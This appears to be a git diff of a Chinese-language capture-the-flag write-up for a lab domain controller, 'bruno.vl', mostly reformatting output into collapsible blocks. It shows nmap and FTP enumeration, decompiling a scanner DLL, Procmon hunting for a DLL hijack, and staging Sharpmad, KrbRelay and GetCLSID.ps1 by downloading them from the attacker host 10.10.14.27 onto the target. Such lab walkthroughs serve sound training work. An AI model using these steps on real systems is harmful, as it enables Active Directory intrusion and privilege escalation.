@@ -11,7 +11,9 @@
 ```
 
 <details>
-	<summary>nmap</summary>
+	
+<summary>nmap</summary>
+	
 ```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.6.204 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 [★]$ nmap -p$ports -sC -sV 10.129.6.204
@@ -106,12 +108,18 @@ Host script results:
 |   date: 2026-03-13T08:08:26
 |_  start_date: N/A
 ```
+
 </details>
+
 ```
 [★]$ echo '10.129.6.204 brunodc.bruno.vl bruno.vl' | sudo tee -a /etc/hosts
 10.129.6.204 brunodc.bruno.vl bruno.vl
 ```
-#### FTP 
+
+<details>
+	
+<summary>FTP </summary>
+	
 ```
 [★]$ ftp bruno.vl
 Connected to brunodc.bruno.vl.
@@ -164,6 +172,9 @@ ftp> ls
 150 Opening ASCII mode data connection.
 226 Transfer complete.
 ```
+
+</details>
+
 #### malicious恶意文件夹和queue队列似乎为空。良性文件夹中仅有一个名为 test.exe 的文件。之后
 #### 下载下来后，我们可以看到它并非可执行文件，而是一个包含字符串“123\n”的 ASCII 文本文件。
 ```
@@ -177,6 +188,13 @@ test.exe: ASCII text
 ```
 [★]$ file changelog
 changelog: ASCII text
+```
+
+<details>
+	
+<summary>cat changelog</summary>
+
+```
 [★]$ cat changelog
 Version 0.3
 - integrated with dev site
@@ -188,11 +206,20 @@ Version 0.2
 Version 0.1
 - initial support for EICAR string
 ```
+
+</details>
+
 #### 它并未提供有关该应用程序的性质和功能的太多信息。然而，“使用 svc_scan 的自动化”这一条提示我们存在一个可能用于通过此应用程序进行自动化操作的账户。
 #### 从 SampleScanner.deps.json 文件中，我们可以获取到该可执行文件所使用的 .NET 版本，即 3.1 。我们还能看到它加载了 SampleScanner.dll 组件。
 ```
 [★]$ file SampleScanner.deps.json
 SampleScanner.deps.json: JSON text data
+```
+<details>
+
+<summary>cat SampleScanner.deps.json</summary>
+
+```
 [★]$ cat  SampleScanner.deps.json
 {
   "runtimeTarget": {
@@ -218,10 +245,19 @@ SampleScanner.deps.json: JSON text data
   }
 }
 ```
+
+</details>
+
 #### 从 SampleScanner.runtimeconfig.dev.json 文件中，我们可以获取到一个用户名--xct 。
 ```
 [★]$ file SampleScanner.runtimeconfig.dev.json
 SampleScanner.runtimeconfig.dev.json: JSON text data
+```
+<details>
+
+<summary>cat  SampleScanner.runtimeconfig.dev.json</summary>
+
+```
 [★]$ cat  SampleScanner.runtimeconfig.dev.json
 {
   "runtimeOptions": {
@@ -232,6 +268,9 @@ SampleScanner.runtimeconfig.dev.json: JSON text data
   }
 }
 ```
+
+</details>
+
 #### 由于我们知道.NET 程序集会被编译成中间语言，所以我们将使用“文件”命令来确认我们获取的可执行文件和.dll 文件中哪些是.NET 程序集。
 ```
 [★]$ file SampleScanner.dll
@@ -263,6 +302,11 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
 #### 选择 ‘process Name' is 'SampleScanner.exe' then 'Include'
 ### [3]安装了dotpeek终于打开了 SampleScanner.dll 文件
 https://www.jetbrains.com/decompiler/
+
+<details>
+
+<summary>SampleScanner.dll</summary>
+
 ```
 // Decompiled with JetBrains decompiler
 // Type: SampleScanner.Program
@@ -323,7 +367,15 @@ internal class Program
   }
 }
 ```
+
+</details>
+
 ### [4]运行Procmon64a.exe
+
+<details>
+
+<summary>Procmon64a.exe的运行不需要触发条件</summary>
+
 ```
 PS C:\samples\app> ls
 
@@ -361,6 +413,9 @@ https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&framework_v
 PS C:\samples\app> .\SampleScanner.dll
 PS C:\samples\app>
 ```
+
+</details>
+
 ### [5]在Process Monitor找 Result:NAME NOT FOUND | Operation:CreateFile
 #### C:\samples\app\hostfxr.dll 里面运行着 KernelBase.dll
 ![图片](images/2026031601.png)
@@ -594,7 +649,7 @@ MAQ         10.129.8.171    389    BRUNODC          MachineAccountQuota: 10 //�
 https://github.com/Kevin-Robertson/Sharpmad/tree/main
 ```
 [★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git //Sharpmad.csproj
-[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.csproj
+[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.exe  && KrbRelay.exe  这个需要在Pwnbox上的目标windows机器编译不了，需要在本机生成.exe再上传
 [★]$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1 
 
 
@@ -604,12 +659,6 @@ ADIDNS.cs  App.config  MAQ.cs  Program.cs  Properties  Sharpmad.csproj  Util.cs
 [~/Sharpmad][★]$ ls
 LICENSE  README.md  Sharpmad  Sharpmad.sln  sharpmad.zip
 
-[~/KrbRelay][★]$ ls CheckPort
-App.config  CheckPort.csproj  obj  Program.cs  Properties
-[~/KrbRelay][★]$ zip -r CheckPort.zip CheckPort
-[~/KrbRelay][★]$ ls
-CheckPort  CheckPort.zip  Images  KrbRelay  KrbRelay.sln  packages  README.md
-
 [~/Sharpmad][★]$ python3 -m http.server 8011
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 
@@ -618,14 +667,18 @@ Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 ```
 PS C:\ProgramData> powershell wget http://10.10.14.27:8011/Sharpmad.zip -o Sharpmad.zip
 
-PS C:\ProgramData> powershell wget http://10.10.14.27:8011/CheckPort.zip -o CheckPort.zip
-
 PS C:\ProgramData> powershell wget http://10.10.14.27:8011/GetCLSID.ps1 -o GetCLSID.ps1
 
 PS C:\programdata> Expand-Archive sharpmad.zip //解压
-PS C:\ProgramData> Expand-Archive CheckPort.zip
 
 PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
+```
+
+<details>
+
+<summary>ls</summary>
+
+```
 ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
 
 
@@ -636,10 +689,21 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----                                                                 
 -a----          5/8/2021   8:15 AM         258344 MSBuild.exe                                                          
 
+```
 
+</details>
+
+```
 PS C:\programdata> cp C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .
 
 PS C:\programdata> ls sharpmad/sharpmad/Sharpmad.csproj //可以不需要.sln,直接使用.csproj生成.exe
+```
+
+<details>
+
+<summary>ls</summary>
+
+```
 ls sharpmad/sharpmad/Sharpmad.csproj
 
 
@@ -650,9 +714,21 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----                                                                 
 -a----         3/16/2026   2:50 AM           2566 Sharpmad.csproj
 
+```
+
+</details>
+
+```
 PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
 
 PS C:\programdata> ls sharpmad/sharpmad/bin/Debug/Sharpmad.exe
+```
+
+<details>
+
+<summary>ls</summary>
+	
+```
 ls sharpmad/sharpmad/bin/Debug/Sharpmad.exe
 
 
@@ -661,10 +737,13 @@ ls sharpmad/sharpmad/bin/Debug/Sharpmad.exe
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
--a----         3/16/2026   8:04 AM          53760 Sharpmad.exe   
+-a----         3/16/2026   8:04 AM          53760 Sharpmad.exe
+```
 
+</details>
+
+```
 PS C:\programdata> cp sharpmad/sharpmad/bin/Debug/Sharpmad.exe .
-
 
 PS C:\ProgramData> .\MSBuild.exe CheckPort/CheckPort/CheckPort.csproj //环境不行，换win11编译
 PS C:\ProgramData> powershell wget http://10.10.14.27:8011/CheckPort.exe -o CheckPort.exe
